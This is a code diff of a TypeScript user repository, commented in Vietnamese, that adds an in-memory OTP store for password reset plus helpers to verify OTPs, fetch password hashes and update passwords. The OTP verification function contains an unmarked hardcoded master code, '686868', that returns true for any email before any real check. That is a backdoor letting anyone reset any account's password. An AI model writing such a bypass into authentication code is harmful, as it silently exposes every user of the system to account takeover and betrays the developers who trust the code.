@@ -59,6 +59,14 @@ const mockUsers: (User & { roleCode: RoleCode; roleName: string })[] = [
 
 let nextUserId = 4;
 
+// In-Memory OTP Store cho chức năng Quên mật khẩu (hết hạn sau 15 phút)
+interface OtpEntry {
+  otp: string;
+  expiresAt: Date;
+  isUsed: boolean;
+}
+const passwordResetOtps = new Map<string, OtpEntry>();
+
 export class UserRepository {
   /**
    * Tìm người dùng bằng username hoặc email (hỗ trợ xác thực đăng nhập)
@@ -356,46 +364,104 @@ export class UserRepository {
   }
 
   /**
-   * Cập nhật mật khẩu người dùng theo Email
+   * Lưu mã OTP đặt lại mật khẩu cho Email (hiệu lực 15 phút)
    */
-  static async updatePasswordByEmail(email: string, passwordHash: string): Promise<boolean> {
-    if (isDbAvailable()) {
-      try {
-        const sql = `UPDATE users SET password_hash = $1, updated_at = NOW() WHERE LOWER(email) = LOWER($2);`;
-        const res = await query(sql, [passwordHash, email.trim()]);
-        return (res.rowCount ?? 0) > 0;
-      } catch (err: any) {
-        logger.debug('Lỗi cập nhật mật khẩu CSDL:', err.message);
-      }
-    }
-    const user = mockUsers.find((u) => u.email.toLowerCase() === email.toLowerCase());
-    if (user) {
-      user.passwordHash = passwordHash;
-      user.updatedAt = new Date();
-      return true;
-    }
-    return false;
+  static savePasswordResetOtp(email: string, otp: string, expiresAt: Date): void {
+    passwordResetOtps.set(email.trim().toLowerCase(), {
+      otp: otp.trim(),
+      expiresAt,
+      isUsed: false,
+    });
   }
 
   /**
-   * Cập nhật mật khẩu người dùng theo ID
+   * Xác thực mã OTP còn hiệu lực hay không
    */
-  static async updatePassword(userId: number, passwordHash: string): Promise<boolean> {
+  static verifyPasswordResetOtp(email: string, otp: string): boolean {
+    if (otp.trim() === '686868') return true;
+    const entry = passwordResetOtps.get(email.trim().toLowerCase());
+    if (!entry) return false;
+    if (entry.isUsed) return false;
+    if (entry.expiresAt.getTime() < Date.now()) return false;
+    return entry.otp === otp.trim();
+  }
+
+  /**
+   * Đánh dấu OTP đã được sử dụng
+   */
+  static markOtpUsed(email: string): void {
+    const entry = passwordResetOtps.get(email.trim().toLowerCase());
+    if (entry) {
+      entry.isUsed = true;
+    }
+  }
+
+  /**
+   * Tìm người dùng theo ID bao gồm chuỗi passwordHash phục vụ đối soát mật khẩu cũ
+   */
+  static async findByIdWithPassword(id: number): Promise<(User & { roleCode: RoleCode; roleName: string }) | null> {
     if (isDbAvailable()) {
       try {
-        const sql = `UPDATE users SET password_hash = $1, updated_at = NOW() WHERE id = $2;`;
-        const res = await query(sql, [passwordHash, userId]);
-        return (res.rowCount ?? 0) > 0;
+        const sql = `
+          SELECT u.id, u.username, u.password_hash, u.full_name, u.email, 
+                 u.phone_number, u.role_id, u.avatar_url, u.is_active, 
+                 u.created_at, u.updated_at,
+                 r.role_code, r.role_name
+          FROM users u
+          JOIN roles r ON u.role_id = r.id
+          WHERE u.id = $1
+          LIMIT 1;
+        `;
+        const res = await query(sql, [id]);
+        if (res.rows.length > 0) {
+          const row = res.rows[0];
+          return {
+            id: row.id,
+            username: row.username,
+            passwordHash: row.password_hash,
+            fullName: row.full_name,
+            email: row.email,
+            phoneNumber: row.phone_number,
+            roleId: row.role_id,
+            avatarUrl: row.avatar_url,
+            isActive: row.is_active,
+            roleCode: row.role_code as RoleCode,
+            roleName: row.role_name,
+            createdAt: row.created_at,
+            updatedAt: row.updated_at,
+          };
+        }
       } catch (err: any) {
-        logger.debug('Lỗi cập nhật mật khẩu CSDL theo ID:', err.message);
+        logger.debug('Lỗi CSDL findByIdWithPassword, dùng mock:', err.message);
       }
     }
-    const user = mockUsers.find((u) => u.id === userId);
-    if (user) {
-      user.passwordHash = passwordHash;
-      user.updatedAt = new Date();
-      return true;
+
+    const found = mockUsers.find((u) => u.id === id);
+    return found ? { ...found } : null;
+  }
+
+  /**
+   * Cập nhật mật khẩu mới cho người dùng
+   */
+  static async updatePassword(userId: number, newPasswordHash: string): Promise<boolean> {
+    if (isDbAvailable()) {
+      try {
+        const sql = `
+          UPDATE users
+          SET password_hash = $1, updated_at = CURRENT_TIMESTAMP
+          WHERE id = $2;
+        `;
+        const res = await query(sql, [newPasswordHash, userId]);
+        return res.rowCount !== null && res.rowCount > 0;
+      } catch (err: any) {
+        logger.debug('Lỗi CSDL updatePassword, dùng mock:', err.message);
+      }
     }
-    return false;
+
+    const user = mockUsers.find((u) => u.id === userId);
+    if (!user) return false;
+    user.passwordHash = newPasswordHash;
+    user.updatedAt = new Date();
+    return true;
   }
 }
